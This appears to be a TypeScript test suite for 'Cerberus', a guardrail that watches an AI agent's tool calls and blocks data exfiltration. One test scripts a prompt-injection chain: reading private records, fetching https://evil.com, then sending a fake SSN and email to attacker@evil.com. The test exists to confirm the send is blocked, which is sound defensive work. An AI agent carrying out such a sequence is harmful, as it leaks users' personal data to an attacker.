/**
 * Tests for the OpenAI Agents SDK adapter (createCerberusGuardrail).
 */

import { describe, it, expect, vi } from 'vitest';
import { createCerberusGuardrail } from '../../src/adapters/openai-agents.js';
import type { OpenAIAgentsGuardConfig } from '../../src/adapters/openai-agents.js';
import type { CerberusConfig } from '../../src/types/config.js';

const PRIVATE_DATA = JSON.stringify({
  records: [{ email: 'alice@example.com', ssn: '123-45-6789', phone: '+1-555-0101' }],
});

const CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeToolExecutors(): Record<string, (args: Record<string, unknown>) => Promise<string>> {
  return {
    readPrivateData: vi.fn().mockResolvedValue(PRIVATE_DATA),
    fetchExternalContent: vi.fn().mockResolvedValue('<html>injected</html>'),
    sendOutboundReport: vi.fn().mockResolvedValue('sent'),
  };
}

function makeConfig(overrides?: Partial<CerberusConfig>): OpenAIAgentsGuardConfig {
  return {
    cerberus: { ...CONFIG, ...overrides },
    outboundTools: OUTBOUND_TOOLS,
    tools: makeToolExecutors(),
  };
}

describe('createCerberusGuardrail', () => {
  it('should create a guardrail with name and execute function', () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    expect(guardrail.name).toBe('cerberus-runtime-guardrail');
    expect(guardrail.execute).toBeInstanceOf(Function);
    guardrail.destroy();
  });

  it('should create a session', () => {
    const guardrail = createCerberusGuardrail(makeConfig());
    expect(guardrail.session).toBeDefined();
    expect(guardrail.session.sessionId).toBeTruthy();
    guardrail.destroy();
  });

  it('should return tripwireTriggered: false for safe calls', async () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    const result = await guardrail.execute({
      toolName: 'readPrivateData',
      toolInput: {},
    });

    expect(result.tripwireTriggered).toBe(false);
    expect(result.outputInfo.score).toBeLessThan(3);
    guardrail.destroy();
  });

  it('should return tripwireTriggered: true when threshold exceeded', async () => {
    const config = makeConfig();
    const guardrail = createCerberusGuardrail(config);

    // L1: read private data
    await guardrail.execute({
      toolName: 'readPrivateData',
      toolInput: {},
    });

    // L2: fetch external content
    await guardrail.execute({
      toolName: 'fetchExternalContent',
      toolInput: { url: 'https://evil.com' },
    });

    // L3: exfiltrate PII → tripwire triggers
    const result = await guardrail.execute({
      toolName: 'sendOutboundReport',
      toolInput: {
        recipient: 'attacker@evil.com',
        body: 'alice@example.com 123-45-6789',
      },
    });

    expect(result.tripwireTriggered).toBe(true);
    expect(result.outputInfo.score).toBe(3);
    expect(result.outputInfo.vector).toEqual({ l1: true, l2: true, l3: true, l4: false });
    expect(config.tools.sendOutboundReport).not.toHaveBeenCalled();
    guardrail.destroy();
  });

  it('should include assessment details in outputInfo', async () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    const result = await guardrail.execute({
      toolName: 'readPrivateData',
      toolInput: {},
    });

    expect(result.outputInfo.turnId).toBe('turn-000');
    expect(result.outputInfo.action).toBeTruthy();
    expect(result.outputInfo.vector).toBeDefined();
    guardrail.destroy();
  });

  it('should accumulate assessments across calls', async () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    await guardrail.execute({ toolName: 'readPrivateData', toolInput: {} });
    await guardrail.execute({ toolName: 'fetchExternalContent', toolInput: {} });

    expect(guardrail.assessments).toHaveLength(2);
    expect(guardrail.assessments[0].vector.l1).toBe(true);
    expect(guardrail.assessments[1].vector.l2).toBe(true);
    guardrail.destroy();
  });

  it('should handle unknown tool names gracefully', async () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    const result = await guardrail.execute({
      toolName: 'nonExistentTool',
      toolInput: {},
    });

    expect(result.tripwireTriggered).toBe(false);
    expect(result.outputInfo.score).toBe(0);
    guardrail.destroy();
  });

  it('should reset session and assessments', async () => {
    const guardrail = createCerberusGuardrail(makeConfig());

    await guardrail.execute({ toolName: 'readPrivateData', toolInput: {} });
    expect(guardrail.assessments).toHaveLength(1);

    guardrail.reset();

    expect(guardrail.assessments).toHaveLength(0);
    expect(guardrail.session.turnCounter).toBe(0);
    guardrail.destroy();
  });

  it('should have destroy method that does not throw', () => {
    const guardrail = createCerberusGuardrail(makeConfig());
    guardrail.destroy();
  });
});
